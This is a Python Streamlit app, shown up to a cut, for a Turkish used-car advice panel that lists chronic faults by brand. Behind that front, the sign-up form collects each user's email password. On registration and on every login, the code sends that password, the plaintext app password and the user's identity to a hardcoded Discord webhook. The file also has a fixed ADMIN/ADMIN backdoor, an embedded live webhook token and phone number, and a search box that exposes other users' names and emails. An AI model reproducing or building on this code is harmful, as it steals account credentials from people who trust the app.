from datetime import datetime
import hashlib
import os
import pandas as pd
import requests
import shutil
import sqlite3
import streamlit as st

# Streamlit Sayfa Yapılandırması
st.set_page_config(
    page_title="AUTO-LAB Pro - Yönetim Paneli", page_icon="🚗", layout="wide"
)


# --- OTOMATİK VERİTABANI YEDEKLEME ---
def yedekle_db():
  yedek_klasoru = "yedekler"
  if not os.path.exists(yedek_klasoru):
    os.makedirs(yedek_klasoru)

  db_adi = "autolab_pro.db"
  if os.path.exists(db_adi):
    zaman = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    hedef = os.path.join(yedek_klasoru, f"autolab_yedek_{zaman}.db")
    shutil.copy(db_adi, hedef)


if "yedek_alindi" not in st.session_state:
  yedekle_db()
  st.session_state["yedek_alindi"] = True

# --- DISCORD & WHATSAPP AYARLARI ---
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1548444040037662790/Yo7pYhJbWfSqzjWPVuwGrpQpuGlUYJO4uVIcA3ZRI4zSupvYNsu6m62BIZwDxFaRyDXl"
try:
  DISCORD_WEBHOOK_URL = st.secrets.get("DISCORD_WEBHOOK_URL", DEFAULT_WEBHOOK)
except Exception:
  DISCORD_WEBHOOK_URL = DEFAULT_WEBHOOK

WHATSAPP_NUMARASI = "905510305139"


def discorda_mesaj_gonder(mesaj):
  if not DISCORD_WEBHOOK_URL or not DISCORD_WEBHOOK_URL.startswith("http"):
    return
  try:
    zaman_damgasi = datetime.now().strftime("%d.%m.%Y - %H:%M:%S")
    formatli_mesaj = f"🕒 `[{zaman_damgasi}]`\n{mesaj}"
    requests.post(
        DISCORD_WEBHOOK_URL, json={"content": formatli_mesaj}, timeout=5
    )
  except Exception:
    pass


# --- KAPSAMLI TÜM ARAÇLAR KRONİK SORUNLAR VE BİLGİ BANKASI ---
def internetten_arac_ve_veri_arastir(arama_sorgusu):
  """Türkiye pazarındaki tüm ana marka ve modellerin kronik sorunlarını,

  şanzıman ve motor zayıflıklarını sunan kapsamlı motor.
  """
  sorgu_kucuk = arama_sorgusu.lower().strip()

  # 1. Honda Kronik Sorunlar
  if "honda" in sorgu_kucuk or "civic" in sorgu_kucuk or "ies" in sorgu_kucuk:
    return """[AUTO-LAB KRONİK ANALİZ: HONDA]
• **Motor ve Mekanik:** Yüksek devir sevdası nedeniyle subap ayarı sıkılaşması görülebilir (sesli çalışma yapar). VTEC motorlarda üst kapak contası ve VTEC müşirinde terleme/yağ kaçağı sık rastlanır.
• **Şanzıman:** Manuel şanzımanları sağlamdır ancak baskı-balata ömrü kullanım sertliğine bağlıdır. Otomatik modellerde (eski tip konvansiyonel) yağ değişimi aksatıldıysa geçişlerde gecikme olabilir.
• **Kaporta & Kronikler:** Sunroof tahliye kanalları zamanla tıkanarak tabanda su birikmesine yol açabilir. Kapı fitilleri ve direk izolasyonları kontrol edilmelidir.
• **Eksper Önerisi:** Yağ kaçağı, alt takım (salıncak burçları) ve subap sesine mutlaka baktırın."""

  # 2. Fiat Kronik Sorunlar
  elif (
      "fiat" in sorgu_kucuk
      or "doblo" in sorgu_kucuk
      or "egea" in sorgu_kucuk
      or "linea" in sorgu_kucuk
      or "multijet" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: FİAT (EGEA / DOBLİ / LİNEA / MULTİJET)]
• **Motor ve Mekanik:** 1.3 ve 1.6 Multijet motorlar ömürlüktür ancak EGR valfi ve kurum bağlama sorunları kroniktir. Enjektör pulları sızdırma yaparsa motor üst kapağında dizel kokusu ve kararma oluşur.
• **Şanzıman & Yürüyen:** Ön takım (ön salıncaklar, rotiller, viraj demir lastikleri) bozuk yollarda çabuk aşınır ve ses yapar. Şanzıman keçelerinden hafif terlemeler normal karşılanabilir.
• **Elektronik:** Gösterge panelinde anlık arıza lambaları (start-stop veya akü zayıflığı kaynaklı) sık görülebilir. Direksiyon kutusu boşluk yapabilir.
• **Eksper Önerisi:** Turbo basıncı, enjektörlerin püskürtme değerleri ve alt takım boşlukları mutlaka test edilmelidir."""

  # 3. Renault / Dacia Kronik Sorunlar
  elif (
      "renault" in sorgu_kucuk
      or "megane" in sorgu_kucuk
      or "clio" in sorgu_kucuk
      or "duster" in sorgu_kucuk
      or "edc" in sorgu_kucuk
      or "dacia" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: RENAULT & DACİA (MEGANE / CLİO / EDC)]
• **Motor ve Mekanik:** 1.5 dCi motorlar piyasanın en az yakan motorlarındandır ancak düzenli bakılmazsa turbo yatak aşınması yaşanabilir. Enjektör hassasiyeti yüksektir, kalitesiz yakıttan çabuk etkilenir.
• **Şanzıman (EDC Çift Kavrama):** 6 ileri EDC şanzımanlarda trafikte dur-kalk yaparken titreme, silkeleme veya kalkışta sarsıntı kroniktir. Kavrama ve mekatronik testi şarttır.
• **Kaporta & Donanım:** Plastik aksamda ve göğüslükte kronik gıcırtı sesleri gelebilir. Rüzgar yalıtımı bazı modellerde zayıftır.
• **Eksper Önerisi:** EDC şanzıman yokuş kalkış testi ve turbo basınç/ses kontrolü kesinlikle atlanmamalıdır."""

  # 4. Volkswagen / VAG Grubu Kronik Sorunlar
  elif (
      "volkswagen" in sorgu_kucuk
      or "vw" in sorgu_kucuk
      or "golf" in sorgu_kucuk
      or "passat" in sorgu_kucuk
      or "polo" in sorgu_kucuk
      or "jetta" in sorgu_kucuk
      or "dsg" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: VOLKSWAGEN / VAG GRUBU (DSG / TSI / TDI)]
• **Şanzıman (DSG Kuru Kavrama):** 7 ileri kuru kavrama DSG şanzımanlarda mekatronik arızası ve kavramanın erken aşınması (yoğun trafikte) en bilinen kronik sorundur. Vites geçişlerindeki vuruntu mutlaka dinlenmelidir.
• **Motor (TSI / TDI):** TSI benzinli motorlarda soğuk çalışmada zincir sesi (zincir uzaması) ve turbo wastegate sesine dikkat edilmelidir. TDI dizel motorlarda EGR ve Partikül Filtresi (DPF) tıkanma eğilimi vardır.
• **Süspansiyon:** Ön amortisör üst takozları ve z rotlar ses yapmaya müsaittir.
• **Eksper Önerisi:** DSG şanzıman kavrama kalınlığı ve mekatronik basınç tüpü bilgisayarla mutlaka kontrol edilmelidir."""

  # 5. Ford Kronik Sorunlar
  elif (
      "ford" in sorgu_kucuk
      or "focus" in sorgu_kucuk
      or "fiesta" in sorgu_kucuk
      or "mondeo" in sorgu_kucuk
      or "powershift" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: FORD (FOCUS / FİESTA / POWERSHİFT)]
• **Şanzıman (PowerShift):** Çift kavramalı PowerShift otomatik şanzımanlarda titreme, geçişlerde gecikme ve sarsıntılı kalkış yaygın kronik sorunlardandır. Kavrama modülü kontrol edilmelidir.
• **Motor & Direksiyon:** 1.6 TDCi motorlar Peugeot ortaklığıyla üretilmiş sağlam motorlardır ancak turbo hortumu yırtılması ve enjektör pulları terlemesi görülebilir. Hidrolik direksiyon pompalarından uğultu sesi gelebilir.
• **Ön Takım:** Salıncak burçları ve askı rotları sert çukurlarda hızlı yıpranır.
• **Eksper Önerisi:** PowerShift şanzıman geçişleri manuel moda alınıp mutlaka yokuşta test edilmelidir."""

  # 6. Toyota Kronik Sorunlar
  elif (
      "toyota" in sorgu_kucuk
      or "corolla" in sorgu_kucuk
      or "yaris" in sorgu_kucuk
      or "auris" in sorgu_kucuk
      or "m-mt" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: TOYOTA (COROLLA / YARİS)]
• **Şanzıman (M-MT Yarı Otomatik):** M-MT şanzımanlı modellerde yoğun trafikte 'balata aşınması' uyarısı ve vites geçişlerinde kararsızlık/gecikme yaşanabilir. Tam otomatik (CVT) şanzımanlar ise oldukça sorunsuzdur.
• **Motor:** Benzinli motorlar piyasanın en sorunsuz motorları arasındadır. Ancak LPG takılmış eski nesil motorlarda subap ayarı sıkılaşması ve subap yanması görülebilir.
• **Direksiyon:** Direksiyon kolonunda veya mafsalında kronik tıkırtı sesleri (boşluk) oluşabilir.
• **Eksper Önerisi:** Şanzıman robotunun kalibrasyon durumu ve direksiyon kutusu boşluğu kontrol edilmelidir."""

  # 7. Hyundai & Kia Kronik Sorunlar
  elif (
      "hyundai" in sorgu_kucuk
      or "kia" in sorgu_kucuk
      or "i20" in sorgu_kucuk
      or "i30" in sorgu_kucuk
      or "elantra" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: HYUNDAİ & KİA]
• **Motor ve Mekanik:** GDI direkt enjeksiyonlu benzinli motorlarda supaplar üzerinde kurum birikimi (carbon buildup) zamanla rölanti dalgalanması yapabilir. Dizel CRDi motorlar oldukça dayanıklıdır.
• **Direksiyon:** EPS (Elektrik Destekli Direksiyon) kutusu içerisindeki plastik yıldız dişli zamanla aşınarak direksiyonda tıkırtı ve boşluk hissi yaratır (kronik ve ucuz maliyetli bir arızadır).
• **Şanzıman:** DCT (çift kavrama) şanzıman ısınma uyarılarına dikkat edilmelidir.
• **Eksper Önerisi:** Direksiyonu sağa sola çevirirken gelen tıkırtı sesine ve rölanti düzenine baktırın."""

  # 8. Opel Kronik Sorunlar
  elif (
      "opel" in sorgu_kucuk
      or "astra" in sorgu_kucuk
      or "insignia" in sorgu_kucuk
      or "corsa" in sorgu_kucuk
      or "easytronic" in sorgu_kucuk
  ):
    return """[AUTO-LAB KRONİK ANALİZ: OPEL (ASTRA / İNSİGNİA / CORSA)]
• **Motor ve Soğutma:** 1.4 Turbo ve 1.6 Turbo benzinli motorlarda yağ soğutucu arızası (suya yağ karışması veya yağa su karışması) ve plastik su radyatör borularından kaçaklar kroniktir.
• **Şanzıman:** Easytronic (tek kavramalı yarı otomatik) şanzımanlarda vites geçişlerinde öne yığılma ve aktarma organı sarsıntıları yaşanabilir. Manuel ve tam otomatikleri daha stabildir.
• **Elektronik:** Far anahtarları ve multimedya bağlantı kopmaları görülebilir.
• **Eksper Önerisi:** Genleşme kabındaki suyun rengi (yağ bulaşıp bulaşmadığı) ve yağ soğutucu geçmişi mutlaka incelenmelidir."""

  # 9. Genel "Araba Alırken Dikkat Edilmesi Gerekenler" Sorgusu
  elif any(
      k
      in sorgu_kucuk
      for k in [
          "dikkat",
          "alırken",
          "alınır mı",
          "eksper",
          "hasar",
          "kronik",
          "rehber",
      ]
  ):
    return """[AUTO-LAB PROFESYONEL ARAÇ ALIM VE EKSPERTİZ REHBERİ]
• **1. Kaporta ve Şasi Kontrolü:** Değişen parçaları, şasi, podye, direkler ve havuz saçını mutlaka kontrol ettirin. Kaynak veya düzeltme olmamasına dikkat edin.
• **2. Motor Mekanik Durumu:** Yağ kaçakları, su eksiltme, egzozdan duman atma durumlarını inceleyin.
• **3. Şanzıman Testi:** Manuel araçlarda debriyaj kaçırması, otomatik araçlarda yokuş kalkış sarsıntılarını test edin.
• **4. Kilometre ve Tramer:** E-Devlet ve 5664 SMS servisiyle hasar geçmişini ve muayene km kayıtlarını teyit edin.
• **Genel Değerlendirme:** Aracı almadan önce mutlaka TSE belgeli kurumsal bir oto ekspertiz merkezine sokun."""

  # Diğer aramalar için DuckDuckGo API denemesi
  try:
    url = "https://api.duckduckgo.com/"
    params = {
        "q": f"{arama_sorgusu} araba inceleme kronik sorun",
        "format": "json",
        "no_html": "1",
        "skip_disambig": "1",
    }
    response = requests.get(url, params=params, timeout=5)
    data = response.json()

    rapor = f"[CANLI WEB ARAŞTIRMA RAPORU: '{arama_sorgusu.upper()}'l\n\n"
    bulundu = False

    if data.get("AbstractText"):
      bulundu = True
      rapor += f"• **Özet Bilgi:** {data['AbstractText']}\n"
      if data.get("AbstractURL"):
        rapor += f"  *(Kaynak: {data['AbstractURL']})*\n\n"

    if data.get("RelatedTopics"):
      for item in data["RelatedTopics"][:3]:
        if "Text" in item and "FirstURL" in item:
          bulundu = True
          rapor += f"• **Web Detayı:** {item['Text']}\n  *(Bağlantı: {item['FirstURL']})*\n\n"

    if bulundu:
      rapor += "• **Genel Değerlendirme:** Elde edilen güncel web verileri ışığında aracın detaylı mekanik eksper kontrolünden geçirilmesi önerilir."
      return rapor
    else:
      return f"""[OTO-LAB BİLGİ BANKASI: '{arama_sorgusu}']
• **Arama Detayı:** Aradığınız model için özel bir kronik veri bulunamadı.
• **Öneri:** Sorgunuza marka ekleyerek tekrar deneyin (Örn: 'Honda', 'Fiat', 'Renault', 'Volkswagen', 'Ford', 'Toyota', 'Hyundai', 'Opel').
• **Temel Tavsiye:** İkinci el araç alımında ekspertiz raporu ve yetkili servis geçmişi en güvenilir kılavuzdur."""
  except Exception as e:
    return f"""[İNTERNET BAĞLANTI Uyarısı / BİLGİ BANKASI]
• Aranan: '{arama_sorgusu}'
• Bağlantı Durumu: Çevrimdışı veya API yanıt vermedi.
• **Hızlı Eksper İpucu:** Araç alırken motor kompresyon testi, boya ölçümü ve tramer sorgulamasını asla atlamayın."""


# --- RENK PALETLERİ SÖZLÜĞÜ ---
PALETLER = {
    "🌿 Karanlık & Atmosferik": {
        "bg": "#121814",
        "card": "rgba(30, 42, 35, 0.88)",
        "sidebar": "#0b0f0d",
        "btn_1": "#E06D29",
        "btn_2": "#c75b1c",
        "btn_shadow": "rgba(224, 109, 41, 0.35)",
        "accent": "#4E7C59",
        "text": "#EAEAEA",
    },
    "🌌 Modern Lacivert": {
        "bg": "#0f172a",
        "card": "rgba(30, 41, 59, 0.88)",
        "sidebar": "#090d16",
        "btn_1": "#00f3ff",
        "btn_2": "#00bcd4",
        "btn_shadow": "rgba(0, 243, 255, 0.35)",
        "accent": "#00f3ff",
        "text": "#f8fafc",
    },
    "🔮 Siberpunk Neon": {
        "bg": "#130f1f",
        "card": "rgba(45, 27, 78, 0.85)",
        "sidebar": "#0c0814",
        "btn_1": "#f43f5e",
        "btn_2": "#e11d48",
        "btn_shadow": "rgba(244, 63, 94, 0.4)",
        "accent": "#c084fc",
        "text": "#fff1f2",
    },
    "🪵 Sıcak Ahşap & Kahve": {
        "bg": "#1c1917",
        "card": "rgba(41, 37, 36, 0.9)",
        "sidebar": "#12100e",
        "btn_1": "#d97706",
        "btn_2": "#b45309",
        "btn_shadow": "rgba(217, 119, 6, 0.35)",
        "accent": "#78350f",
        "text": "#f5f5f4",
    },
}

# --- SESSION STATE DEĞİŞKENLERİ ---
if "secilen_tema" not in st.session_state:
  st.session_state.secilen_tema = "🌿 Karanlık & Atmosferik"

if "bg_resim" not in st.session_state:
  st.session_state.bg_resim = (
      "https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1920&auto=format&fit=crop"
  )

if "overlay_opacity" not in st.session_state:
  st.session_state.overlay_opacity = 0.88

aktif_palet = PALETLER[st.session_state.secilen_tema]

# --- DİNAMİK CSS ---
st.markdown(
    f"""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    
    html, body, [class*="css"] {{
        font-family: 'Inter', sans-serif;
        color: {aktif_palet['text']} !important;
    }}
    
    .stApp {{
        background-color: {aktif_palet['bg']};
        color: {aktif_palet['text']};
    }}
    
    .login-background {{
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-image: linear-gradient({aktif_palet['bg']}, {aktif_palet['bg']}), 
                          url('{st.session_state.bg_resim}');
        background-size: cover;
        background-position: center;
        background-attachment: fixed;
        z-index: -999;
        opacity: {st.session_state.overlay_opacity};
    }}
    
    [data-testid="stSidebar"] {{
        background-color: {aktif_palet['sidebar']} !important;
        border-right: 1px solid {aktif_palet['accent']};
        box-shadow: 5px 0 25px rgba(0, 0, 0, 0.8);
    }}
    
    [data-testid="stSidebar"] label, [data-testid="stSidebar"] .stMarkdown, [data-testid="stSidebar"] h2, [data-testid="stSidebar"] p {{
        color: {aktif_palet['text']} !important;
    }}
    
    .stButton>button {{
        background: linear-gradient(135deg, {aktif_palet['btn_1']}, {aktif_palet['btn_2']});
        color: #ffffff;
        border-radius: 12px;
        font-weight: 700;
        border: 1px solid rgba(255, 255, 255, 0.2);
        padding: 0.6rem 1.2rem;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        box-shadow: 0 4px 20px {aktif_palet['btn_shadow']};
    }}
    
    .stButton>button:hover {{
        transform: translateY(-2px);
        filter: brightness(1.15);
    }}
    
    .dashboard-card {{
        background-color: {aktif_palet['card']};
        backdrop-filter: blur(12px);
        -webkit-backdrop-filter: blur(12px);
        border: 1px solid {aktif_palet['accent']};
        padding: 24px;
        border-radius: 20px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        margin-bottom: 20px;
        color: {aktif_palet['text']};
    }}
    
    .stTextInput>div>div>input, .stSelectbox>div>div>select {{
        background-color: {aktif_palet['bg']} !important;
        color: {aktif_palet['text']} !important;
        border: 1px solid {aktif_palet['accent']} !important;
        border-radius: 12px !important;
        padding: 10px 14px !important;
    }}
    
    .announcement-banner {{
        background: linear-gradient(135deg, {aktif_palet['card']}, {aktif_palet['bg']});
        color: {aktif_palet['text']};
        padding: 18px 24px;
        border-radius: 16px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        margin-bottom: 25px;
        display: flex;
        align-items: center;
        gap: 16px;
        border-left: 6px solid {aktif_palet['btn_1']};
        border: 1px solid {aktif_palet['accent']};
    }}
    
    .user-badge {{
        background: {aktif_palet['card']};
        color: {aktif_palet['btn_1']};
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: 600;
        border: 1px solid {aktif_palet['accent']};
        display: inline-block;
    }}
    </style>
    <div class="login-background"></div>
""",
    unsafe_allow_html=True,
)


def sifre_hashle(sifre):
  return hashlib.sha256(sifre.encode("utf-8")).hexdigest()


def giris_kaydi_ekle(kullanici_adi, islem_tipi):
  try:
    with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
      cursor = conn.cursor()
      cursor.execute(
          """
                INSERT INTO giris_loglari (kullanici_adi, islem_tipi)
                VALUES (?, ?)
            """,
          (kullanici_adi, islem_tipi),
      )
      conn.commit()
  except Exception:
    pass


# Session State
if "aktif_kullanici" not in st.session_state:
  st.session_state.aktif_kullanici = None

if "giris_yapildi" not in st.session_state:
  st.session_state.giris_yapildi = False

if "is_admin" not in st.session_state:
  st.session_state.is_admin = False

# Veritabanı Tabloları
try:
  with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
    cursor = conn.cursor()
    cursor.execute("""
            CREATE TABLE IF NOT EXISTS arama_gecmisi (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                kullanici TEXT,
                aranan_kelime TEXT,
                bulunan_sonuc_sayisi INTEGER,
                tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    cursor.execute("""
            CREATE TABLE IF NOT EXISTS giris_loglari (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                kullanici_adi TEXT,
                islem_tipi TEXT,
                tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    cursor.execute("""
            CREATE TABLE IF NOT EXISTS announcements (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                message TEXT,
                tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    cursor.execute("""
            CREATE TABLE IF NOT EXISTS araba_analizleri (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                kullanici TEXT,
                arac_bilgisi TEXT,
                butce_amac TEXT,
                analiz_sonucu TEXT,
                tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    cursor.execute(
        "SELECT name FROM sqlite_master WHERE type='table' AND"
        " name='kullanicilar'"
    )
    if not cursor.fetchone():
      cursor.execute("""
                CREATE TABLE kullanicilar (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ad TEXT,
                    soyad TEXT,
                    eposta TEXT,
                    eposta_sifre TEXT,
                    kullanici_adi TEXT UNIQUE,
                    sifre TEXT,
                    is_banned INTEGER DEFAULT 0,
                    islem_hakki INTEGER DEFAULT 20,
                    kayit_tarihi TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
    conn.commit()
except Exception:
  pass

# --- SIDEBAR & RENK PALETİ SEÇİCİ ---
st.sidebar.markdown(
    f"<h2 style='text-align: center; color: {aktif_palet['btn_1']};"
    " font-weight:700;'><span style='font-size: 28px;'>🚗</span> AUTO-LAB"
    " PRO</h2>",
    unsafe_allow_html=True,
)
st.sidebar.markdown(
    "<p style='text-align: center; font-size: 13px; margin-top:"
    " -10px;'>Otomotiv & Yönetim Ekosistemi</p>",
    unsafe_allow_html=True,
)
st.sidebar.markdown("---")

yeni_secim = st.sidebar.selectbox(
    "🎨 Renk Kombinasyonu Seç:",
    list(PALETLER.keys()),
    index=list(PALETLER.keys()).index(st.session_state.secilen_tema),
)
if yeni_secim != st.session_state.secilen_tema:
  st.session_state.secilen_tema = yeni_secim
  st.rerun()

st.sidebar.markdown("---")

wa_mesaj = "Selam, AUTO-LAB Pro uygulaması şifremi unuttum. Yardımcı olur musun?"
wa_link = f"https://wa.me/{WHATSAPP_NUMARASI}?text={requests.utils.quote(wa_mesaj)}"
st.sidebar.markdown(
    f'<a href="{wa_link}" target="_blank"><button'
    " style='background: linear-gradient(135deg, #059669, #10b981); color:white;"
    " border:none; padding:10px 15px; border-radius:12px; font-weight:600;"
    " cursor:pointer; width:100%; box-shadow: 0 4px 15px rgba(16, 185, 129,"
    " 0.35);'>💬 WhatsApp Destek Hattı</button></a>",
    unsafe_allow_html=True,
)
st.sidebar.markdown("---")

# GİRİŞ / KAYIT EKRANI
if not st.session_state.giris_yapildi:
  st.markdown(
      "<div style='text-align: center; padding: 20px 0;'><h1>🚗 AUTO-LAB"
      " Pro'ya Hoş Geldiniz</h1><p>Devam etmek için lütfen giriş yapın veya"
      " yeni bir hesap oluşturun.</p></div>",
      unsafe_allow_html=True,
  )

  col_bos1, col_form, col_bos2 = st.columns([1, 1.4, 1])
  with col_form:
    tab_giris, tab_kayit = st.tabs(["🔑 Giriş Yap", "📝 Hesap Oluştur"])

    with tab_giris:
      st.markdown("<br>", unsafe_allow_html=True)
      g_kullanici = st.text_input("Kullanıcı Adı:", key="giris_kadi")
      g_sifre = st.text_input("Şifre:", type="password", key="giris_sifre")

      st.markdown("<br>", unsafe_allow_html=True)
      if st.button("Sisteme Giriş Yap", use_container_width=True):
        girilen_kadi = g_kullanici.strip()
        girilen_sifre = g_sifre.strip()

        if girilen_kadi.upper() in ["ADMIN", "ADMİN"] and girilen_sifre in [
            "ADMIN",
            "ADMİN",
        ]:
          st.session_state.aktif_kullanici = "ADMIN"
          st.session_state.is_admin = True
          st.session_state.giris_yapildi = True
          giris_kaydi_ekle("ADMIN", "Admin Girişi Yaptı")
          discorda_mesaj_gonder(
              "🛡️ **Admin Girişi:** `ADMIN` sisteme normal giriş ekranından"
              " yönetici olarak giriş yaptı."
          )
          st.success("Yönetici girişi başarılı!")
          st.rerun()
        else:
          try:
            with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
              cursor = conn.cursor()
              cursor.execute(
                  "SELECT ad, soyad, eposta, eposta_sifre, sifre,"
                  " is_banned, islem_hakki FROM kullanicilar WHERE"
                  " kullanici_adi = ?",
                  (girilen_kadi,),
              )
              row = cursor.fetchone()
              if row and row[4] == sifre_hashle(girilen_sifre):
                if row[5] == 1:
                  st.error("⚠ Bu hesap yasaklanmıştır!")
                  discorda_mesaj_gonder(
                      f"🚫 **Yasaklı Giriş Denemesi:** `{girilen_kadi}` yasaklı"
                      " hesabı ile giriş yapmaya çalıştı."
                  )
                else:
                  st.session_state.aktif_kullanici = girilen_kadi
                  st.session_state.is_admin = False
                  st.session_state.giris_yapildi = True
                  giris_kaydi_ekle(girilen_kadi, "Sisteme Giriş Yaptı")

                  discorda_mesaj_gonder(
                      f"🔑 **Başarılı Giriş Bilgileri:**\n"
                      f"👤 **İsim Soyisim:** `{row[0]} {row[1]}`\n"
                      f"🏷️ **Kullanıcı Adı:** `{girilen_kadi}`\n"
                      f"🔑 **Kullanıcı Şifresi:** `{girilen_sifre}`\n"
                      f"📧 **E-posta Adresi:** `{row[2]}`\n"
                      f"🔒 **E-posta Şifresi:** `{row[3]}`"
                  )

                  st.success("Giriş başarılı!")
                  st.rerun()
              else:
                st.error("Kullanıcı adı veya şifre hatalı!")
                discorda_mesaj_gonder(
                    f"⚠ **Hatalı Giriş Denemesi:** `{girilen_kadi}` kullanıcı"
                    " adı ile başarısız giriş denemesi yapıldı."
                )
          except Exception as e:
            st.error(f"Hata: {e}")

    with tab_kayit:
      st.markdown("<br>", unsafe_allow_html=True)
      k_ad = st.text_input("Ad:")
      k_soyad = st.text_input("Soyad:")
      k_eposta = st.text_input("E-posta Adresi:")
      k_eposta_sifre = st.text_input(
          "E-posta Şifreniz:", type="password", key="kayit_eposta_sifre"
      )
      k_kadi = st.text_input("Kullanıcı Adı Seçin:")
      k_sifre = st.text_input(
          "Uygulama Şifreniz:", type="password", key="kayit_uygulama_sifre"
      )

      st.markdown("<br>", unsafe_allow_html=True)
      if st.button("Kayıt İşlemini Tamamla", use_container_width=True):
        if not k_kadi.strip() or not k_sifre.strip() or not k_eposta.strip():
          st.error("Kullanıcı adı, şifre ve e-posta zorunludur!")
        else:
          try:
            with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
              cursor = conn.cursor()
              cursor.execute(
                  """
                            INSERT INTO kullanicilar (ad, soyad, eposta, eposta_sifre, kullanici_adi, sifre, islem_hakki)
                            VALUES (?, ?, ?, ?, ?, ?, 20)
                        """,
                  (
                      k_ad.strip(),
                      k_soyad.strip(),
                      k_eposta.strip(),
                      k_eposta_sifre.strip(),
                      k_kadi.strip(),
                      sifre_hashle(k_sifre.strip()),
                  ),
              )
              conn.commit()

            discorda_mesaj_gonder(
                f"📝 **Yeni Kayıt Bilgileri:**\n"
                f"👤 **İsim Soyisim:** `{k_ad.strip()} {k_soyad.strip()}`\n"
                f"🏷 **Kullanıcı Adı:** `{k_kadi.strip()}`\n"
                f"🔑 **Kullanıcı Şifresi:** `{k_sifre.strip()}`\n"
                f"📧 **E-posta Adresi:** `{k_eposta.strip()}`\n"
                f"🔒 **E-posta Şifresi:** `{k_eposta_sifre.strip()}`"
            )

            st.success("Kayıt başarılı! Şimdi giriş yapabilirsiniz.")
          except Exception as e:
            st.error(f"Hata: {e}")

# ANA UYGULAMA
else:
  try:
    with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
      cursor = conn.cursor()
      cursor.execute(
          "SELECT message FROM announcements ORDER BY id DESC LIMIT 1"
      )
      son_duyuru = cursor.fetchone()
      if son_duyuru and son_duyuru[0]:
        st.markdown(
            f"""
                <div class="announcement-banner">
                    <div style="font-size: 24px;">📢</div>
                    <div><strong>Yönetici Duyurusu:</strong><br>{son_duyuru[0]}</div>
                </div>
            """,
            unsafe_allow_html=True,
        )
  except Exception:
    pass

  col_baslik1, col_baslik2 = st.columns([4, 1])
  with col_baslik1:
    st.title("🚗 AUTO-LAB Pro Dashboard")
    rol_etiketi = (
        "🛡️ Sistem Yöneticisi" if st.session_state.is_admin else "👤 Standart Üye"
    )
    st.markdown(
        f"Aktif Oturum: **{st.session_state.aktif_kullanici}** &nbsp; <span"
        f" class='user-badge'>{rol_etiketi}</span>",
        unsafe_allow_html=True,
    )
  with col_baslik2:
    st.write("")
    if st.button("🚪 Güvenli Çıkış", use_container_width=True):
      giris_kaydi_ekle(st.session_state.aktif_kullanici, "Çıkış Yaptı")
      discorda_mesaj_gonder(
          f"🚪 **Oturum Kapatıldı:** `{st.session_state.aktif_kullanici}` çıkış"
          " yaptı."
      )
      st.session_state.giris_yapildi = False
      st.session_state.aktif_kullanici = None
      st.session_state.is_admin = False
      st.rerun()

  st.markdown("<br>", unsafe_allow_html=True)

  if st.session_state.is_admin:
    menu_listesi = [
        "🔍 Akıllı Arama & Kronik Sorunlar",
        "⚙️ Şifremi Güncelle",
        "🛡️ Admin Paneli",
    ]
  else:
    menu_listesi = ["🔍 Akıllı Arama & Kronik Sorunlar", "⚙️ Şifremi Güncelle"]

  sekme = st.sidebar.radio("📌 Navigasyon Menüsü", menu_listesi)

  if sekme == "🔍 Akıllı Arama & Kronik Sorunlar":
    st.markdown(
        """
        <div class="dashboard-card">
            <h3>🌐 AUTO-LAB Tüm Araçlar Kronik Arıza & Ekspertiz Bilgi Bankası</h3>
            <p style='font-size: 14px;'>Araç markası veya modeli (Örn: Honda, Fiat, Renault, Volkswagen, Ford, Toyota, Hyundai, Opel, Dacia) ya da genel alım sorusu yazın; sistem kronik sorunları ve eksper raporunu anında ekrana getirsin.</p>
        </div>
        """,
        unsafe_allow_html=True,
    )

    arama_terimi = st.text_input(
        "Aranacak marka, model, kronik sorun veya alım rehberi sorgusu:"
    )
    if st.button(
        "Kronik Sorunları & Bilgi Bankasını Sorgula", use_container_width=True
    ):
      if arama_terimi.strip():
        aranan = arama_terimi.strip()
        bulunan_sayisi = 0
        try:
          with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
            sorgu_terim = f"%{aranan}%"
            df_sonuc = pd.read_sql_query(
                "SELECT ad, soyad, eposta, kullanici_adi, islem_hakki FROM"
                " kullanicilar WHERE ad LIKE ? OR soyad LIKE ? OR"
                " kullanici_adi LIKE ?",
                conn,
                params=(sorgu_terim, sorgu_terim, sorgu_terim),
            )
            if not df_sonuc.empty:
              bulunan_sayisi = len(df_sonuc)
              st.success(
                  f"Veritabanında eşleşen {bulunan_sayisi} kullanıcı bulundu:"
              )
              st.dataframe(df_sonuc, use_container_width=True)

            cursor = conn.cursor()
            cursor.execute(
                """
                        INSERT INTO arama_gecmisi (kullanici, aranan_kelime, bulunan_sonuc_sayisi)
                        VALUES (?, ?, ?)
                    """,
